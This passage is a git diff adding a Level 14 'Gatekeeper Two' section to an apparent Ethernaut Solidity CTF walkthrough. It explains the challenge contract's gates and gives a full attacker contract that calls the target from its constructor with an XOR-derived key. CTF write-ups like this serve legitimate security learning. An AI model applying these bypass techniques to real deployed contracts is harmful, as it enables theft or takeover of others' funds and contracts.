@@ -17,6 +17,7 @@ If you want to do the same, I recommend that you try to solve the levels on your
 12. [Level 11: Elevator](#level-11-elevator)
 13. [Level 12: Privacy](#level-12-privacy)
 14. [Level 13: Gatekeeper One](#level-13-gatekeeper-one)
+15. [Level 14: Gatekeeper Two](#level-14-gatekeeper-two)
 
 ## Level 0: Intro <a name="level-0-intro"></a>
 
@@ -1056,3 +1057,86 @@ Deploy and call the `attack()` function with the address of the GatekeeperOne co
 
 Not sure to be honest :D It takes time, but still can be cracked, and there are multiple ways to
 do it. The brute force approach is one of them, but it is not the most efficient one.
+
+## Level 14: Gatekeeper Two <a name="level-14-gatekeeper-two"></a>
+
+Let's have a look at the contract first:
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract GatekeeperTwo {
+    address public entrant;
+
+    modifier gateOne() {
+        require(msg.sender != tx.origin);
+        _;
+    }
+
+    modifier gateTwo() {
+        uint256 x;
+        assembly {
+            x := extcodesize(caller())
+        }
+        require(x == 0);
+        _;
+    }
+
+    modifier gateThree(bytes8 _gateKey) {
+        require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);
+        _;
+    }
+
+    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
+        entrant = tx.origin;
+        return true;
+    }
+}
+```
+Let's get going :)
+
+First gate - easy, we know that one already: proxy contract.
+
+Second gate: `extcodesize(caller())` returns the size of a contract at a given address. `caller()` will return the address
+of the one calling the account. That';'s apparently a Yul function. How do we overcome this gate check? `extcodesize` returns the
+size of a deployed contract. If we write a contract which is in the process of deployment, `extcodesize` is going to return 0, since
+the code has not been stored at the given address yet.
+
+Last requirement statement:
+`require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);`
+
+Let's have a look into that, one by one
+
+I believe that some mathematical law applies for XOR, which allows us to do the following:
+`A XOR B = C => A XOR C = B and B XOR C = A`
+
+For our requirement statement that means:
+
+`uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max)`
+
+`uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) == type(uint64).max) ^ uint64(_gateKey)`
+
+`type(uint64).max) ^ uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) == uint64(_gateKey)`
+
+Time to craft our contract:
+
+```solidity
+interface GatekeeperTwo {
+    function enter(bytes8 _gateKey) external returns (bool);
+}
+
+contract GateCrusherTwo {
+    constructor(address _contract) {
+        GatekeeperTwo got = GatekeeperTwo(_contract);
+        bytes8 _gateKey = bytes8(type(uint64).max ^ uint64(bytes8(keccak256(abi.encodePacked(address(this))))));
+        got.enter(_gateKey);
+    }
+}
+```
+
+There we go :)
+Submit and you are done :)
+
+### Learning
+Nothing is safe from us :)
